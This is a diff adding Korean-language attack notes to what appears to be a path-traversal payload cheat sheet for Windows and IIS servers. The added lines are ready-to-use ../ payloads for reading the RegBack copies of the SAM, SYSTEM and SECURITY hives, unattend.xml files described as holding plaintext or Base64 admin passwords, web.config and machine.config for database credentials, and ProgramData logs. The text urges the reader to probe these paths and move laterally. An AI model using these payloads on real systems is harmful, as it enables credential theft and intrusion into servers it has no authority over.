@@ -140,3 +140,38 @@ C:\Users\[사용자명]\source\repos\
 ../../../../../../Windows/System32/config/SYSTEM
 ​IIS 전체 설정 (모든 웹사이트 경로 노출):
 ../../../../../../Windows/System32/inetsrv/config/applicationHost.config
+
+
+​1. SAM 대신 '백업본' 노리기 (RegBack)
+​윈도우는 레지스트리가 망가질 것을 대비해 주기적으로 C:\Windows\System32\config\RegBack 폴더에 복사본을 만듭니다. 이 파일들은 시스템이 사용 중이지 않아 잠금이 걸려 있지 않습니다.
+​SAM 백업: ../../../../../../Windows/System32/config/RegBack/SAM
+​SYSTEM 백업: ../../../../../../Windows/System32/config/RegBack/SYSTEM
+​SECURITY 백업: ../../../../../../Windows/System32/config/RegBack/SECURITY
+​주의: 윈도우 10 최신 버전이나 윈도우 11에서는 이 백업 기능이 기본적으로 꺼져 있을 수 있습니다. 하지만 서버급(Windows Server)에서는 여전히 작동하는 경우가 많으니 꼭 찔러보세요.
+​2. 사용자 폴더가 막혔을 때 '공용 폴더' 탈취
+​C:\Users\[계정명] 폴더 자체가 권한으로 막혔다면, 모든 사용자가 공유하거나 시스템이 임시로 쓰는 폴더를 노려야 합니다.
+​무인 설치 설정 (비밀번호 노다지):
+윈도우 설치 시 관리자 계정을 자동 생성했다면 비밀번호가 평문이나 Base64로 남아있습니다.
+../../../../../../Windows/Panther/unattend.xml
+../../../../../../Windows/Panther/Unattended.xml
+../../../../../../Windows/System32/sysprep/unattend.xml
+​Public 폴더 (공용 바탕화면):
+여기는 권한이 매우 낮아 웬만하면 열립니다. 사내 공용 매뉴얼이나 공유 파일이 있을 수 있습니다.
+../../../../../../Users/Public/Desktop/desktop.ini (존재 확인용)
+../../../../../../Users/Public/Documents/
+​3. IIS 웹 서버의 '심장' 털기
+​사용자 계정을 못 털어도, 지금 이 웹 사이트가 돌아가는 설정 파일만 얻으면 DB 권한을 얻어 수평 이동이 가능합니다.
+​현재 웹 루트의 web.config:
+파일명만 web.config로 해서 현재 폴더나 상위 폴더를 찌르세요.
+web.config
+../web.config
+​PHP 환경일 경우:
+config.php / db_connect.php
+​ASP.NET 글로벌 설정:
+../../../../../../Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config
+​4. 프로그램 설치 로그 (ProgramData)
+​C:\Users는 막혀도 C:\ProgramData는 보안이 훨씬 허술합니다. 여기서 설치된 소프트웨어의 로그나 설정 파일을 찾으세요.
+​안랩/V3 로그 (사내 PC 국룰):
+../../../../../../ProgramData/AhnLab/SmartUpdate/Download/Log/
+​구글 크롬 설치 정보:
+../../../../../../ProgramData/Google/Chrome/External Extensions/
